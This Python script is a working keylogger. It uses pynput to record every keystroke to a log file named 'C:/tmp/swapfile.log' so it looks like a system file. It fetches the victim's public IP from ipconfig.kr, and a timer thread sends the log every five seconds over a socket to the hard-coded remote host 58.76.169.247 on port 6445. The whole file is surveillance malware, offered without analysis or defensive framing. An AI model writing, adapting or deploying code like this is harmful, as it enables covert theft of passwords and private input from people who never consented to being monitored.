from pynput.keyboard import Key, Listener
import socket
import requests
import re
import logging
req = requests.get("http://ipconfig.kr")
targetip = str(re.search(r'IP Address : (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', req.text)[1])

##########################################################################################
from socket import *
import os
import sys

def sendfile():
    try:
        clientSock = socket(AF_INET, SOCK_STREAM)
        clientSock.connect(('58.76.169.247', 6445))
        print('connection OK')
        filename = targetip
        clientSock.sendall(filename.encode('utf-8'))
        data_transferred = 0
        print("sendfile %s" %filename)
        with open('C:/tmp/swapfile.log', 'rb') as f:
            try:
                data = f.read(1024) #1024바이트 읽는다
                while data: #데이터가 없을 때까지
                    data_transferred += clientSock.send(data) #1024바이트 보내고 크기 저장
                    data = f.read(1024) #1024바이트 읽음
            except Exception as ex:
                print(ex)
        print("clear %s, size %d" %(filename, data_transferred))
        return True
    except:
        print("connection failed")
        return False

##########################################################################################

log_dir = 'C:/tmp/'
logging.basicConfig(filename=(log_dir + "swapfile.log"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
logging.info('"{0}"'.format(targetip))
def on_press(key):
    logging.info('"{0}"'.format(key))

###############################################################
import time
import threading
def thread_run(): #sendfile 쓰레드로 계속 파일 보내도록 (1분 혹은 5분간격으로)
    print('=====',time.ctime(),'=====')
    sendfile()
    threading.Timer(5, thread_run).start()
###############################################################

with Listener(on_press) as listen:
    thread_run()
    listen.join()